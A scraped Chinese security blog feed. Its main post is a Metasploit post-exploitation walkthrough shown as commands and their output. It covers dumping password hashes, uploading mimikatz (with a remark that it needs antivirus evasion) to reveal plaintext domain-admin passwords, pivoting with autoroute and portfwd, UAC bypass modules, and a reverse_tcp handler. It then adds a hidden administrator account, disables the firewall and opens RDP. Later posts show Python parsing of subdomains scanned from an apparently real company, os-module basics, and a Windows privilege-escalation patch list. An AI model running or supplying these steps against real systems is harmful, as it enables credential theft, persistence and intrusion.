KB2534111 applied[*] KB2999226 applied[*] KB976902 applied Hash与明文密码获取获取目标机系统用户Hash #需要SYSTEM权限 12345678910111213141516171819run post/windows/gather/smart_hashdump[*] Running module against STU1[*] Hashes will be saved to the database if one is connected.[+] Hashes will be saved in loot in JtR password file format to:[*] /Users/apple/.msf4/loot/20200903163754_default_172.20.10.6_windows.hashes_560643.txt[*] Dumping password hashes...[*] Running as SYSTEM extracting hashes from registry[*] Obtaining the boot key...[*] Calculating the hboot key using SYSKEY fd4639f4e27c79683ae9fee56b44393f...[*] Obtaining the user list and keys...[*] Decrypting user keys...[*] Dumping password hints...[*] No users with password hints on this system[*] Dumping password hashes...[+] Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::[+] liukaifeng01:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::[+] whoami:1004:aad3b435b51404eeaad3b435b51404ee:e5292ea58e7e150003e00454b6bc729a:::[+] steady:1012:aad3b435b51404eeaad3b435b51404ee:218a30a4dc767f75f1456e646a5d07cd:::[+] steady123:1013:aad3b435b51404eeaad3b435b51404ee:218a30a4dc767f75f1456e646a5d07cd::: 如果当前用户没有足够的权限 123456789meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump[*] Running module against WEB[*] Hashes will be saved to the database if one is connected.[+] Hashes will be saved in loot in JtR password file format to:[*] &#x2F;Users&#x2F;apple&#x2F;.msf4&#x2F;loot&#x2F;20201012180509_default_172.20.10.13_windows.hashes_113739.txt[*] Dumping password hashes...[-] On this version of Windows you need to be NT AUTHORITY\\SYSTEM to dump the hashes[-] Try setting GETSYSTEM to true. 获得了本地账户的hask，获取明文密码，我们需要先载入mimikatz模块(需要免杀处理) 1meterpreter &gt; upload mimikatz.exe 目标位置 1234meterpreter &gt; upload &#x2F;tmp&#x2F;mimikatz.exe D:\\S_JCIN\\WebSite\\OutWeb\\L_CT\\News[*] uploading : &#x2F;tmp&#x2F;mimikatz.exe -&gt; D:S_JCINWebSiteOutWebL_CTNews[*] Uploaded 1020.76 KiB of 1020.76 KiB (100.0%): &#x2F;tmp&#x2F;mimikatz.exe -&gt; D:S_JCINWebSiteOutWebL_CTNews[*] uploaded : &#x2F;tmp&#x2F;mimikatz.exe -&gt; D:S_JCINWebSiteOutWebL_CTNews mimikatz的使用 123456789101112131415161718192021222324252627282930313233343536373839404142c:\\\\mimikatz.exec:\\&gt;mimikatz.exemimikatz.exe .#####. mimikatz 2.2.0 (x64) #19041 Aug 16 2020 10:26:39 .## ^ ##. &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## &gt; http://blog.gentilkiwi.com/mimikatz &#x27;## v ##&#x27; Vincent LE TOUX ( vincent.letoux@gmail.com ) &#x27;#####&#x27; &gt; http://pingcastle.com / http://mysmartlogon.com ***/mimikatz # privilege::debugPrivilege &#x27;20&#x27; OKmimikatz # sekurlsa::logonPasswordsAuthentication Id : 0 ; 2499588 (00000000:00262404)Session : Interactive from 1User Name : AdministratorDomain : GODLogon Server : OWALogon Time : 2020/9/3 13:38:09SID : S-1-5-21-2952760202-1353902439-2381784089-500 msv : [00000003] Primary * Username : Administrator * Domain : GOD * LM : 3333deaae325ebb705026d3fb1a43796 * NTLM : 7d0e302e0cbd94d9353ac4a51d7c39c1 * SHA1 : d4f206f0d8303230185b2ff2fedb7d40a62effa5 tspkg : * Username : Administrator * Domain : GOD * Password : 1999118gxaGXA. wdigest : * Username : Administrator * Domain : GOD * Password : 1999118gxaGXA. kerberos : * Username : Administrator * Domain : GOD.ORG * Password : 1999118gxaGXA. ssp : credman : msf自身使用mimikaz 使用 mimikatz 模块需要System权限，所以我们在使用该模块之前需要将当前MSF中的shell提升为system。 1234加载kiwi模块load mimikatz查看kiwi模块的使用help mimikatz 使用以下命令查看系统中的明文密码 1mimikatz_command -f sekurlsa::searchPasswords kiwi模块同时支持32位和64位的系统，但是该模块默认是加载32位的系统，所以如果目标主机是64位系统的话，直接默认加载该模块会导致很多功能无法使用。所以如果目标系统是64位的，则必须先查看系统进程列表，然后将meterpreter进程迁移到一个64位程序的进程中，才能加载kiwi并且查看系统明文。如果目标系统是32位的，则没有这个限制。 hashdump meterpreter权限不够，将其进程迁移到含有system的进程中（即使你getuid是system，但进程不在system也无法获得，亲测。 12meterpreter &gt; hashdump[-] 2007: Operation failed: The parameter is incorrect. 提升权限1meterpreter &gt; getsystem 如果getsystem获取不到权限，基本是被UAC限制了。 域信息收集查找域控制器12345run post/windows/gather/enum_domain #查找域控meterpreter &gt; run post/windows/gather/enum_domain[+] FOUND Domain: god[+] FOUND Domain Controller: owa (IP: 192.168.52.138) ifconfig查看DNS服务器地址代理与端口设置设置sockets5代理搜索一下可用代理 1234567891011msf5 &gt; search socksMatching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/scanner/http/sockso_traversal 2012-03-14 normal No Sockso Music Host Server 1.5 Directory Traversal 1 auxiliary/server/socks4a normal No Socks4a Proxy Server 2 auxiliary/server/socks5 normal No Socks5 Proxy Server 3 auxiliary/server/socks_unc normal No SOCKS Proxy UNC Path Redirection 设置代理 12345678910111213141516171819202122232425262728msf5 &gt; use auxiliary/server/socks5msf5 auxiliary(server/socks5) &gt; show optionsModule options (auxiliary/server/socks5): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD no Proxy password for SOCKS5 listener SRVHOST 0.0.0.0 yes The address to listen on SRVPORT 1080 yes The port to listen on USERNAME no Proxy username for SOCKS5 listenerAuxiliary action: Name Description ---- ----------- Proxymsf5 auxiliary(server/socks5) &gt; set SRVHOST 127.0.0.1SRVHOST =&gt; 127.0.0.1msf5 auxiliary(server/socks5) &gt; set SRVPORT 5555SRVPORT =&gt; 5555msf5 auxiliary(server/socks5) &gt; run[*] Auxiliary module running as background job 0.msf5 auxiliary(server/socks5) &gt;[*] Starting the socks5 proxy server 然后也可以直接使用一下命令 12set proxies socks5:127.0.0.1:8990 设置代理setg ReverseAllowProxy true 允许反向代理 获取内网网段 1234567meterpreter &gt; run get_local_subnets[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.[!] Example: run post/multi/manage/autoroute OPTION=value [...]Local subnet: 169.254.0.0/255.255.0.0Local subnet: 172.20.10.0/255.255.255.240Local subnet: 192.168.52.0/255.255.255.0 添加路由 1meterpreter &gt; run autoroute -s 198.168.52.0&#x2F;24 查看是否添加成功 1234567891011meterpreter &gt; run autoroute -p[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.[!] Example: run post/multi/manage/autoroute OPTION=value [...]Active Routing Table==================== Subnet Netmask Gateway ------ ------- ------- 198.168.52.0 255.255.255.0 Session 1 ARP扫描内网主机 添加去往”内网网段”的路由 MSF 路由添加帮助查询命令 12345678910111213meterpreter &gt; run autoroute -h[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.[!] Example: run post/multi/manage/autoroute OPTION=value [...][*] Usage: run autoroute [-r] -s subnet -n netmask[*] Examples:[*] run autoroute -s 10.1.1.0 -n 255.255.255.0 # Add a route to 10.10.10.1/255.255.255.0[*] run autoroute -s 10.10.10.1 # Netmask defaults to 255.255.255.0[*] run autoroute -s 10.10.10.1/24 # CIDR notation is also okay[*] run autoroute -p # Print active routing table[*] run autoroute -d -s 10.10.10.1 # Deletes the 10.10.10.1/255.255.255.0 route[*] Use the &quot;route&quot; and &quot;ipconfig&quot; Meterpreter commands to learn about available routes[-] Deprecation warning: This script has been replaced by the post/multi/manage/autoroute module 获取目标内网地址段 具体获取被攻击目标内网地址网段的命令 12345meterpreter &gt; run get_local_subnets[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.[!] Example: run post/multi/manage/autoroute OPTION=value [...]Local subnet: 172.17.0.0/255.255.0.0 由上可以获知，目标内网网段是“172.17.0.0./24” 添加去往目标网段的转发路由 在meterpreter 会话上直接添加去往目标网段的路由，具体添加方法 1234567meterpreter &gt; run autoroute -s 172.17.0.0/24[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.[!] Example: run post/multi/manage/autoroute OPTION=value [...][*] Adding a route to 172.17.0.0/255.255.255.0...[+] Added route to 172.17.0.0/255.255.255.0 via 10.48.8.234[*] Use the -p option to list all active routes 添加网路由后，我们来查看下路由的添加情况如何 1234567891011meterpreter &gt; run autoroute -p[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.[!] Example: run post/multi/manage/autoroute OPTION=value [...]Active Routing Table==================== Subnet Netmask Gateway ------ ------- ------- 172.17.0.0 255.255.255.0 Session 3 将去往内网的路由打通后，接下来就可以使用MSF平台直接对内网主机扫描和进行各种高危漏洞的直接渗透利用了。 删除路由 1meterpreter &gt; run autoroute -d -s 172.20.10.0 autoroute模块获取当前机器的所有网段信息123456meterpreter &gt; run get_local_subnets[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.[!] Example: run post/multi/manage/autoroute OPTION=value [...]Local subnet: 10.10.10.0/255.255.255.0Local subnet: 172.20.10.0/255.255.255.240 添加目标内网网段的路由1234567meterpreter &gt; run autoroute -s 10.10.10.0/24[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.[!] Example: run post/multi/manage/autoroute OPTION=value [...][*] Adding a route to 10.10.10.0/255.255.255.0...[+] Added route to 10.10.10.0/255.255.255.0 via 172.20.10.13[*] Use the -p option to list all active routes 打印当前添加的路由表信息1234567891011meterpreter &gt; run autoroute -p[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.[!] Example: run post/multi/manage/autoroute OPTION=value [...]Active Routing Table==================== Subnet Netmask Gateway ------ ------- ------- 10.10.10.0 255.255.255.0 Session 4 删除指定的路由 1meterpreter &gt; run autoroute -d -s 10.10.10.0&#x2F;24 内网主机发现进去内网之后，我们使用相关模块进行主机发现。 TCP扫描12345678910111213msf5 exploit(multi&#x2F;handler) &gt; use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcpmsf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; show optionsmsf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; set threads 10threads &#x3D;&gt; 10msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; set RHOSTS 172.18.0.2-100RHOSTS &#x3D;&gt; 172.18.0.2-100msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; set PORTS 3306,8022PORTS &#x3D;&gt; 3306,8022msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; exploit[+] 172.18.0.3: - 172.18.0.3:3306 - TCP OPEN[+] 172.18.0.2: - 172.18.0.2:8022 - TCP OPEN[*] 172.18.0.2-100: - Scanned 10 of 99 hosts (10% complete) ARP扫描1use post&#x2F;windows&#x2F;gather&#x2F;arp_scanner Metasploit Portfwd（端口转发/重定向）在活动的Meterpreter会话中，键入portfwd -h将显示命令的各种选项和参数。 123456789meterpreter &gt; portfwd -hUsage: portfwd [-h] [add | delete | list | flush] [args]OPTIONS: -L &gt;opt&gt; 要监听的本地主机（可选）。 -h 帮助横幅。 -l &gt;opt&gt; 要监听的本地端口。 -p &gt;opt&gt; 要连接的远程端口 -r &gt;opt&gt; 要连接的远程主机meterpreter &gt; Options：选项 123456789-L：用于指定监听主机。 除非需要在特定网络适配器上进行转发，否则可以省略此选项。如果未输入任何值，则将使用0.0.0.0。-h：显示以上信息。-l：这是一个本地端口，它将在攻击机器上侦听。与此端口的连接将被转发到远程系统。-p：TCP连接将转发到的端口。-r：连接被中继到的IP地址（目标）。 Arguments：参数 1234567Add：该参数用于创建转发。Delete：这将从我们的转发端口列表中删除先前的条目。List：这将列出当前转发的所有端口。Flush：这将删除我们的转发列表中的所有端口。 例子： Add参数 1meterpreter &gt; portfwd add –l 3389 –p 3389 –r [target host] 1234add会将端口转发添加到列表中，并将为我们创建一个隧道。请注意，此通道也将存在于Metasploit控制台之外，使其可用于任何终端会话。-l 3389是本地端口，将被监听并转发到我们的目标。这可以是您的机器上的任何端口，只要它尚未被使用。-p 3389是我们的定向主机上的目标端口。-r [target host]是我们的目标系统的IP或主机名。 List参数 12345meterpreter &gt; portfwd list0: 0.0.0.0:3389 -&gt; 172.16.194.191:33891: 0.0.0.0:1337 -&gt; 172.16.194.191:13372: 0.0.0.0:2222 -&gt; 172.16.194.191:22223 total local port forwards. Windows权限提升 绕过UAC bypassuac 12345678910111213141516171819202122msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac或者msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injectionmsf5 exploit(windows&#x2F;local&#x2F;bypassuac) &gt; show optionsModule options (exploit&#x2F;windows&#x2F;local&#x2F;bypassuac): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION yes The session to run this module on. TECHNIQUE EXE yes Technique to use if UAC is turned off (Accepted: PSH, EXE)Exploit target: Id Name -- ---- 0 Windows x86msf5 exploit(windows&#x2F;local&#x2F;bypassuac) &gt;set target 1set target 1 #设置目标系统类型，1是64位，0是32位 12use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac #该模块运行时会因为在目标机上创建多个文件而被杀毒软件识别，因此通过该模块提权成功率很低。use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection #该模块直接运行在内存的反射DLL中，所以不会接触目标机器的硬盘，从而降低了被杀毒软件检测出来的概率。 RunAs绕过 创建一个可执行文件，目标机会运行一个发起提升权限请求的程序，提示用户是否要继续运行，如果用户选择“是”，就会触发返回一个高权限的meterpreter shell。 123456789101112131415161718192021msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;askmsf5 exploit(windows&#x2F;local&#x2F;ask) &gt; show optionsModule options (exploit&#x2F;windows&#x2F;local&#x2F;ask): Name Current Setting Required Description ---- --------------- -------- ----------- FILENAME no File name on disk PATH no Location on disk, %TEMP% used if not set SESSION yes The session to run this module on. TECHNIQUE EXE yes Technique to use (Accepted: PSH, EXE)Exploit target: Id Name -- ---- 0 Windowsmsf5 exploit(windows&#x2F;local&#x2F;ask) &gt; Windows渗透cmd与3389 监听木马 1234567891011121314msf5 post(multi&#x2F;manage&#x2F;autoroute) &gt; chcp 65001[-] Unknown command: chcp.msf5 post(multi&#x2F;manage&#x2F;autoroute) &gt; use exploit&#x2F;multi&#x2F;handlermsf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcppayload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcpmsf5 exploit(multi&#x2F;handler) &gt; set LHOST 172.20.10.3LHOST &#x3D;&gt; 172.20.10.3msf5 exploit(multi&#x2F;handler) &gt; set LPORT 1234LPORT &#x3D;&gt; 1234msf5 exploit(multi&#x2F;handler) &gt; exploit[*] Started reverse TCP handler on 172.20.10.3:1234[*] Sending stage (176195 bytes) to 172.20.10.6[*] Meterpreter session 1 opened (172.20.10.3:1234 -&gt; 172.20.10.6:6198) at 2020-09-05 12:31:20 +0800 获取当前权限以及提权 123456meterpreter &gt; getuidServer username: GOD\\Administratormeterpreter &gt; getsystem...got system via technique 1 (Named Pipe Impersonation (In Memory&#x2F;Admin)).meterpreter &gt; getuidServer username: NT AUTHORITY\\SYSTEM 切换cmdshell，注意切换之后cmdshell与msf的会话具有相同的权限 添加用户并加入管理员组 12345678C:\\Windows\\system32&gt;net user steady111 125219gxaGXA &#x2F;addnet user steady111 125219gxaGXA &#x2F;add命令成功完成。C:\\Windows\\system32&gt;net localgroup administrators steady111 &#x2F;addnet localgroup administrators steady111 &#x2F;add命令成功完成。 开启关闭防火墙 windows2003之前 1234开启防火墙：netsh firewall set opmode mode&#x3D;enable关闭防火墙：netsh firewall set opmode mode&#x3D;disable windows2003之后 1netsh advfirewall set allprofiles state off 开启3389 123456REG ADD &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f REG ADD &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; 2&gt;&amp;1Server\\WinStations\\RDP-Tcp&quot; &#x2F;v PortNumber &#x2F;t REG_DWORD &#x2F;d 0x00000d3d &#x2F;f&quot; 2&gt;&amp;1 检查3389是否开放 123456REG QUERY &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; &#x2F;v fDenyTSConnectionsHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server1表示关闭0表示开放fDenyTSConnections REG_DWORD 0x1 查看远程桌面服务所在的端口 12REG QUERY &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp&quot; &#x2F;v PortNumberHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp MSF与3389123run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp #开启远程桌面run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp USERNAME&#x3D;www2 PASSWORD&#x3D;123456 #添加用户run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp FORWARD&#x3D;true LPORT&#x3D;6662 #将3389端口转发到6662 12portfwd add -l 6666 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地6666端口run getgui -f 6661 –e","categories":[{"name":"内网安全","slug":"内网安全","permalink":"http://s1eady.top/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"内网","slug":"内网","permalink":"http://s1eady.top/tags/%E5%86%85%E7%BD%91/"}]},{"title":"Python学习--渗透测试小脚本","slug":"Python学习--渗透测试小脚本","date":"2020-11-11T12:10:12.000Z","updated":"2020-11-10T02:34:24.714Z","comments":true,"path":"2020/11/11/Python学习--渗透测试小脚本/","link":"","permalink":"http://s1eady.top/2020/11/11/Python%E5%AD%A6%E4%B9%A0--%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E8%84%9A%E6%9C%AC/","excerpt":"","text":"Python处理excel文档 pd.read_excel读取文件内容123456789101112131415161718192021222324252627282930import pandas as pdcontent_list &#x3D; pd.read_excel(&quot;.&#x2F;52mf.com.xlsx&quot;)print(content_list)&#x2F;usr&#x2F;local&#x2F;bin&#x2F;python3.7 &#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;code&#x2F;python&#x2F;数据处理&#x2F;获取子域名的url id url ... elapsed count0 9 http:&#x2F;&#x2F;52mf.com:80 ... 0.2 11 43 http:&#x2F;&#x2F;mail.52mf.com:80 ... 2.5 22 51 https:&#x2F;&#x2F;mail.52mf.com:443 ... 2.5 23 60 http:&#x2F;&#x2F;renter-api.52mf.com:80 ... 2.6 34 68 https:&#x2F;&#x2F;renter-api.52mf.com:443 ... 2.6 35 77 http:&#x2F;&#x2F;www.52mf.com:80 ... 2.6 36 85 https:&#x2F;&#x2F;www.52mf.com:443 ... 2.6 37 94 http:&#x2F;&#x2F;m.52mf.com:80 ... 9.4 48 102 https:&#x2F;&#x2F;m.52mf.com:443 ... 9.4 49 111 http:&#x2F;&#x2F;oa.52mf.com:80 ... 9.4 410 145 http:&#x2F;&#x2F;vpn.52mf.com:80 ... None 111 153 https:&#x2F;&#x2F;vpn.52mf.com:443 ... None 112 162 http:&#x2F;&#x2F;smtp.52mf.com:80 ... None 213 170 https:&#x2F;&#x2F;smtp.52mf.com:443 ... None 214 179 http:&#x2F;&#x2F;provider.52mf.com:80 ... None 415 196 http:&#x2F;&#x2F;pop.52mf.com:80 ... None 516 204 https:&#x2F;&#x2F;pop.52mf.com:443 ... None 517 230 http:&#x2F;&#x2F;imap.52mf.com:80 ... None 718 238 https:&#x2F;&#x2F;imap.52mf.com:443 ... None 719 281 http:&#x2F;&#x2F;s.52mf.com:80 ... None 1320 289 https:&#x2F;&#x2F;s.52mf.com:443 ... None 1321 315 http:&#x2F;&#x2F;autodiscover.52mf.com:80 ... None 1622 323 https:&#x2F;&#x2F;autodiscover.52mf.com:443 ... None 16 name:指定列名123值为list或者str，默认None，一般使用list传参&lt;br&gt;指定表头的名称，list内的值跟表的列数要一一对应，即不能多也不能少，多或者少都会抛出ValueError错误: Number of passed names did not match number of header fields in the file使用str类型传参时会循环出每一个字符在赋值给每一个表头，即不能多也不能少，多或者少都会抛出ValueError错误。 12345678910111213141516171819202122232425262728293031import pandas as pdcontent_list &#x3D; pd.read_excel(&quot;.&#x2F;52mf.com.xlsx&quot;,names&#x3D;&quot;abcdefghijklmn&quot;)print(content_list)&#x2F;usr&#x2F;local&#x2F;bin&#x2F;python3.7 &#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;code&#x2F;python&#x2F;数据处理&#x2F;获取子域名的url a b ... m n0 9 http:&#x2F;&#x2F;52mf.com:80 ... 0.2 11 43 http:&#x2F;&#x2F;mail.52mf.com:80 ... 2.5 22 51 https:&#x2F;&#x2F;mail.52mf.com:443 ... 2.5 23 60 http:&#x2F;&#x2F;renter-api.52mf.com:80 ... 2.6 34 68 https:&#x2F;&#x2F;renter-api.52mf.com:443 ... 2.6 35 77 http:&#x2F;&#x2F;www.52mf.com:80 ... 2.6 36 85 https:&#x2F;&#x2F;www.52mf.com:443 ... 2.6 37 94 http:&#x2F;&#x2F;m.52mf.com:80 ... 9.4 48 102 https:&#x2F;&#x2F;m.52mf.com:443 ... 9.4 49 111 http:&#x2F;&#x2F;oa.52mf.com:80 ... 9.4 410 145 http:&#x2F;&#x2F;vpn.52mf.com:80 ... None 111 153 https:&#x2F;&#x2F;vpn.52mf.com:443 ... None 112 162 http:&#x2F;&#x2F;smtp.52mf.com:80 ... None 213 170 https:&#x2F;&#x2F;smtp.52mf.com:443 ... None 214 179 http:&#x2F;&#x2F;provider.52mf.com:80 ... None 415 196 http:&#x2F;&#x2F;pop.52mf.com:80 ... None 516 204 https:&#x2F;&#x2F;pop.52mf.com:443 ... None 517 230 http:&#x2F;&#x2F;imap.52mf.com:80 ... None 718 238 https:&#x2F;&#x2F;imap.52mf.com:443 ... None 719 281 http:&#x2F;&#x2F;s.52mf.com:80 ... None 1320 289 https:&#x2F;&#x2F;s.52mf.com:443 ... None 1321 315 http:&#x2F;&#x2F;autodiscover.52mf.com:80 ... None 1622 323 https:&#x2F;&#x2F;autodiscover.52mf.com:443 ... None 16 usecols123456值为None、int、str、list类型，指定读取表格的指定列 None时，读取整个excel列int时，读取从第一列开始到该数值（包含）结束的中间所有列str时，只能按照excel的格式指定列，如&quot;A: G&quot;，读取A列到G列的所有列list时，list的元素只能是int型，如：[1, 4],表示读取list内指定的第一和第四列 案例–渗透中扫描到子域名存入xlsx文件并提取子域名12345678910import pandas as pdcontent_list = pd.read_excel(&quot;./52mf.com.xlsx&quot;,usecols=[2,5],names=None)contents_list = content_list.values.tolist()with open(&#x27;./mofang_url.txt&#x27;,&#x27;w&#x27;) as fp: for list in contents_list: print(list[0]) fp.write(list[0]+&quot;\\n&quot;) Python处理cvs文档CSV文件的写入1234567891011121314import csv# 以写入方式打开一个csv文件file = open(&#x27;steady.csv&#x27;,&#x27;w&#x27;)# 调用writer方法，传入csv文件对象，得到的结果是一个CSVWriter对象writer = csv.writer(file)# 调用CSVWriter对象的writerow方法，一行行的写入数据writer.writerow([&#x27;name&#x27;, &#x27;age&#x27;, &#x27;score&#x27;])# 还可以调用writerows方法，一次性写入多行数据writer.writerows([[&#x27;zhangsan&#x27;, &#x27;18&#x27;, &#x27;98&#x27;],[&#x27;lisi&#x27;, &#x27;20&#x27;, &#x27;99&#x27;], [&#x27;wangwu&#x27;, &#x27;17&#x27;, &#x27;90&#x27;], [&#x27;jerry&#x27;, &#x27;19&#x27;, &#x27;95&#x27;]])file.close() CSV文件的读取12345678910111213import csv# 以读取方式打开一个csv文件file = open(&#x27;steady.csv&#x27;, &#x27;r&#x27;)# 调用csv模块的reader方法，得到的结果是一个可迭代对象reader = csv.reader(file)# 对结果进行遍历，获取到结果里的每一行数据for row in reader: print(row)file.close()","categories":[{"name":"Python学习","slug":"Python学习","permalink":"http://s1eady.top/categories/Python%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://s1eady.top/tags/Python/"}]},{"title":"Python学习--os库的使用","slug":"Python学习--os库的使用","date":"2020-11-10T00:34:13.000Z","updated":"2020-11-10T01:29:26.011Z","comments":true,"path":"2020/11/10/Python学习--os库的使用/","link":"","permalink":"http://s1eady.top/2020/11/10/Python%E5%AD%A6%E4%B9%A0--os%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"","text":"OSOS模块简单的来说它是一个Python的系统编程的操作模块，可以处理文件和目录这些我们日常手动需要做的操作。 使用方式获取当前系统y12import osprint(os.name) 输出 1#若是Windows则输出&#39;nt&#39;，若是Linux&#x2F;Unix，则是&#39;posix&#39; 获取当前文件的绝对路径123import ossteady_path = os.path.abspath(__file__)print(steady_path) 输出 1&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;steady.py 获取当前目录123import oscwd &#x3D; os.getcwd()print(cwd) 输出：获取的是python的工作目录。 1&#x2F;Users&#x2F;apple 判断文件是否存在，返回值为布尔型1234import ossteady_path = r&quot;/Users/apple/Desktop/steady.py&quot;steady_file = os.path.exists(steady_path)print(&quot;file path: [&#123;&#125;] is exist: &#123;&#125;&quot;.format(steady_path, steady_file)) 输出 1file path: [&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;steady.py] is exist: True 获取当前文件的名称123import ossteady_name = os.path.basename(__file__)print(steady_name) 输出 1steady.py 文件重命名1234567import osold_file = r&quot;/Users/apple/Desktop/steady.py&quot;new_file = r&quot;/Users/apple/Desktop/steady.py&quot;os.rename(old_file, new_file) 创建文件夹os.makedirs创建多级目录，路径中的多个文件夹都不存在时，可以递归创建，steady和steady1文件夹本身没有。 12steady_path &#x3D; r&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;steady&#x2F;steady1&quot;os.mkdir(steady_path) os.path.mkdir只能创建一个文件夹， steady文件夹存在，才能创建steady1文件夹，如果steady文件夹不存在，则会出错。 12steady_path &#x3D; r&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;steady&#x2F;steady1&quot;os.mkdir(steady_path) 获取文件夹下的所有文件名获取文件夹code下的所有文件名，以列表的形式返回。 123steady_path &#x3D; r&quot;&#x2F;Users&#x2F;apple&quot;steady_names &#x3D; os.listdir(steady_path)print(steady_names) 获取文件夹下的所有文件夹和文件（无递归遍历）1print(os.scandir(r&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;&quot;)) 输出 1&lt;posix.ScandirIterator object at 0x1056a1e30&gt; 返回的是可迭代对象，可以用for循环迭代一下遍出结果。 f.is_file()is_file判断是否是文件。 将path分割成路径名和文件名1234import osprint(os.path.split(r&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;steady1.py&quot;))print(os.path.split(r&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;steady1.py&quot;)[0])print(os.path.split(r&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;steady1.py&quot;)[1]) 输出 12&#x2F;Users&#x2F;apple&#x2F;Desktopsteady1.py 拼接目录与文件名或目录12import osprint(os.path.join(&#39;I&#39;, &#39;am&#39;, &#39;steady&#39;)) 输出 1I&#x2F;am&#x2F;steady","categories":[{"name":"Python学习","slug":"Python学习","permalink":"http://s1eady.top/categories/Python%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://s1eady.top/tags/Python/"}]},{"title":"渗透测试--windows系统常见漏洞与系统补丁","slug":"渗透测试--windows系统常见漏洞与系统补丁","date":"2020-11-06T21:03:06.000Z","updated":"2020-11-21T08:40:54.028Z","comments":true,"path":"2020/11/07/渗透测试--windows系统常见漏洞与系统补丁/","link":"","permalink":"http://s1eady.top/2020/11/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E4%B8%8E%E7%B3%BB%E7%BB%9F%E8%A1%A5%E4%B8%81/","excerpt":"","text":"Win2003123456789101112131415161718192021222324252627282930KB2360937|MS10-084KB2478960|MS11-014KB2507938|MS11-056KB2566454|MS11-062KB2646524|MS12-003KB2645640|MS12-009KB2641653|MS12-018KB944653|MS07-067KB952004|MS09-012 PRKB971657|MS09-041KB2620712|MS11-097KB2393802|MS11-011KB942831|MS08-005KB2503665|MS11-046KB2592799|MS11-080KB956572|MS09-012烤肉KB2621440|MS12-020KB977165|MS10-015Ms ViruKB3139914|MS16-032KB3124280|MS16-016KB3134228|MS16-014KB3079904|MS15-097KB3077657|MS15-077KB3045171|MS15-051KB3000061|MS14-058KB2829361|MS13-046KB2850851|MS13-053EPATHOBJ 0day 限32位KB2707511|MS12-042 sysret -pidKB2124261|KB2271195 MS10-065 IIS7KB970483|MS09-020IIS6 Win2008123456789101112KB3139914|MS16-032KB3124280|MS16-016KB3134228|MS16-014KB3079904|MS15-097KB3077657|MS15-077KB3045171|MS15-051KB3000061|MS14-058KB2829361|MS13-046KB2850851|MS13-053EPATHOBJ 0day 限32位KB2707511|MS12-042 sysret -pidKB2124261|KB2271195 MS10-065 IIS7KB970483|MS09-020IIS6 